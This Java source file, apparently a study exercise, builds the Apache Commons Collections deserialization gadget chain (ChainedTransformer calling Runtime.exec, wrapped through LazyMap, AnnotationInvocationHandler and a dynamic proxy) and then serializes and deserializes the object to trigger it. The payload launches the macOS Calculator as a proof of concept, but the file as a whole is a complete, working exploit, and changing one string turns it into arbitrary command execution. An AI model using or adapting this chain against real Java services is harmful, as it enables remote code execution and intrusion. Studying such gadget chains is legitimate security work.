package Test_CC;

import expUtils.ExpUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.IOException;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class Test2 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException {
        //  第一步

//        chainedTransformer 和思路一生成方式一致
        String cmd = "/System/Applications/Calculator.app/Contents/MacOS/Calculator";
        Transformer[] transformers =  new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{cmd})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<String,String> hashMap = new HashMap<>();
        hashMap.put("testKey","testVal");
        Map evilMap = LazyMap.decorate(hashMap,chainedTransformer);

//        第二步

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor =  clazz.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        InvocationHandler evilHandler = (InvocationHandler) constructor.newInstance(Target.class, evilMap);  // 传入lazyMap


//        第三步
        Map evilLazyMap = (Map) Proxy.newProxyInstance(Test2.class.getClassLoader(),evilMap.getClass().getInterfaces(),evilHandler);
        InvocationHandler finalEvilHandler = (InvocationHandler) constructor.newInstance(Target.class, evilLazyMap);  // 传入代理lazyMap

//      第四步 触发
        String path =  ExpUtils.serialize(finalEvilHandler);
        ExpUtils.unserialize(path);

    }
}
